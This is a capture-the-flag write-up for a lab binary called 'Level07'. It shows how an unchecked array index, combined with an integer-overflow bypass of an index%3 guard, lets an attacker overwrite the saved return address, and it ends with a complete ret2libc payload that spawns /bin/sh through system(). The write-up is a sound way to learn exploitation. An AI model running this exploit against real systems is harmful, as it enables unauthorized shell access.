# Level07
### What does the binary do
After reversing the binary, we can see :
- We have an array (data[100]) in which we can store and read values.
- The catch is some parts are protected for wil (the admin maybe) by : ``` (index % 3 == 0) || ((number >> 24) == 0xb7) ```

But, it doesn't check if the index is under 100.
So, we can probably read and store something in the memory !

## Understand what we can find with the data array being unprotected
To find something interesting, we started at index 101, which is where the array overflows on the memory.

At data[114], we find 4158936339 which is 0xf7e45513 in hexadecimal.
When looking at this address in gdb with : ```x/i 0xf7e45513```

We get : ```data[114] = 0xf7e45513 → __libc_start_main+243``` 

Which means:
This is the return address used by the main function, the address it will jump to when it finishes the program.

The problem is :
We can't save a value in data[114] because it is protected by the condition : ```if index % 3 == 0```

So we tried overwriting the index 114 with a value that is not a multiple of 3. Then we tried INT MAX + 114 ``` 2147483648 + 114 = 2147483762```

```2147483762 % 3 = 2``` so we bypass the condition and can overwrite data[114] this way.

## The exploit
- We tried executing a shell by storing a shellcode in five different parts of the data array from data[0] to data[4], then replacing the data[114] with the address where the data array starts, but this solution did not suceed.

- Then, we thought of using the same technique as in level 04, where we overwrite the exit function with the address of the system function, and then we call the system function with the address of "/bin/sh" as an argument.

## Look for addresses
We use gdb to look for both addresses
To do so, we first break inside the main function and run the file to load and see the addresses

```
p system
```
This will give us the address of system

### Get libc memory range:
```
info proc map
```
We need to note down the start and end addresses of libc, which we will use to find "/bin/sh"

### Find the `/bin/sh` string inside libc:
```
find <libc_start>, <libc_end>, "/bin/sh"
```
This gives us the address to use as an argument with the system() call.

## The final payload

system() address is 0xf7e6aed0
"/bin/sh" address is 0xf7f897ec
We can see both these addresses are the same as in level04, because the libc used is the same

Then, we convert both addresses in their hexadecimal values, giving us :
system() value is 4159090384
Our final payload is 4160264172

We store the system() value in data[114], nothing in data[115], it will be our padding and finally the "/bin/sh" value in data[116]

```(python -c 'print "store"'; python -c 'print "4159090384"'; python -c 'print "2147483762"'; python -c 'print "store"'; python -c 'print "4160264172"'; python -c 'print "116"'; python -c 'print "quit"'; cat) | ./level07```